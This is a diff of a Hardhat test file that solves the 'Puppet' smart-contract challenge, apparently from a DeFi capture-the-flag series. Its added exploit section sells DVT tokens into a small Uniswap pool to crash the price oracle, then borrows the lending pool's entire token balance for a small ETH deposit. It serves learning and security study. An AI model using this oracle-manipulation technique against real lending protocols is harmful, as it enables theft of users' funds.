@@ -5,6 +5,10 @@ const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
+// tokensSold: number of tokens to be traded 
+// tokensInReserve: number of tokens in the Uniswap pool
+// etherInReserve: number of ETH in the Uniswap pool
+// fee: 0.3% 
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
     return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
         (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
@@ -15,8 +19,8 @@ describe('[Challenge] Puppet', function () {
     let deployer, attacker;
 
     // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
-    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
-    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');
+    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10'); // DVT
+    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10'); // ETH
 
     const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
     const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
@@ -86,6 +90,11 @@ describe('[Challenge] Puppet', function () {
                 UNISWAP_INITIAL_ETH_RESERVE
             )
         );
+        const a = calculateTokenToEthInputPrice(
+            ethers.utils.parseEther('1'),
+            UNISWAP_INITIAL_TOKEN_RESERVE,
+            UNISWAP_INITIAL_ETH_RESERVE
+        )
         
         // Setup initial token balances of pool and attacker account
         await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
@@ -99,10 +108,62 @@ describe('[Challenge] Puppet', function () {
         expect(
             await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
         ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
+        
+        console.log(
+            'Oracle price intially set to 1 DVT = 1 ETH', 
+            String(await this.lendingPool._computeOraclePrice())
+        )
+        expect(await this.lendingPool._computeOraclePrice()).to.be.eq(ethers.utils.parseEther('1'))
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        console.log('Attacker initial DVT balance: ', ethers.utils.formatEther(await this.token.balanceOf(attacker.address)));  // 1000 DVT
+        
+        // approve the uniswap exchange contract to transfer DVTs on attacker's behalf
+        await this.token.connect(attacker).approve(
+            this.uniswapExchange.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+            // ethers.utils.parseEther('1')
+        );
+        console.log('ETH balance before the swap: ', ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address)))
+        console.log('DVT balance before the swap: ', ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)))
+        // 1. Attacker sell 1000 DVT for ETH on DVT-ETH exchange (-> this will decrease the price of DVT relative to ETH) 
+        console.log('>>>>>>>> Attacker sell 1000 DVT for ETH on DVT-ETH exchange')
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            // ATTACKER_INITIAL_TOKEN_BALANCE - 1,
+            ethers.utils.parseEther('999'), // 1 subtracted because `to.be.gt(POOL_INITIAL_TOKEN_BALANCE);` 
+            1, // this cannot be 0 
+            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+            { gasLimit: 1e6 }
+        )
+        
+        console.log('Uniswap ETH balance after the swap: ', ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address)))
+        console.log('Uniswap DVT balance after the swap: ', ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)))
+
+        // Now the ratio is 0.000098516632405915...
+        console.log(
+            'Oracle price after selling 1000 DVT for ETH: ', 
+            ethers.utils.formatEther(await this.lendingPool._computeOraclePrice())
+        )
+        // expect(await this.lendingPool._computeOraclePrice()).to.be.eq('98321649443991')
+        
+        console.log('Attacker DVT balance: ', ethers.utils.formatEther(await this.token.balanceOf(attacker.address))); // 0 DVT
+        const balance = await ethers.provider.getBalance(attacker.address);
+
+        // Attacker's ether balance increased from 25ETH -> 35ETH
+        console.log(`Attacker ETH balance: ${ethers.utils.formatEther(balance)}`); // 35 ETH
+        
+        const depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log('Deposit required to buy all DVTs: ', ethers.utils.formatEther(depositRequired)); // 20 ETH
+        
+        console.log('>>>>>>> Use the ETH received to borrow all DVTs from the pool')
+   
+        // 2. Use the ETH received to borrow all DVTs from the pool
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {
+            value: depositRequired,
+        });
     });
 
     after(async function () {
